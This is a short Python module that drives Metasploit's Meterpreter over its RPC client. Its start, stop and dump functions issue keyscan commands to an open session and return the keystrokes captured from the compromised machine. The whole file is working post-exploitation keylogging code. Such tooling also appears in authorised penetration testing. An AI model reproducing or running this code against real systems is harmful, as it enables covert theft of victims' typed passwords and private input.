from metasploit.msfrpc import MsfRpcClient
import time
import httplib


def start(shell):
	shell.write('keyscan_start\n')
	time.sleep(0.5)
	ret = shell.read()
	return


def stop(shell):
	shell.write('keyscan_stop\n')
	time.sleep(0.5)
	try:
		ret = shell.read()
	except httplib.CannotSendRequest as e:
		time.sleep(1)
		ret = shell.read()
	return
	

def dump(shell):
	shell.write('keyscan_dump\n')
	time.sleep(1)
	ret = shell.read()
	ret = ret.replace('Dumping captured keystrokes...\n', '')
	ret = ret.replace('\n\n', '')
	return ret
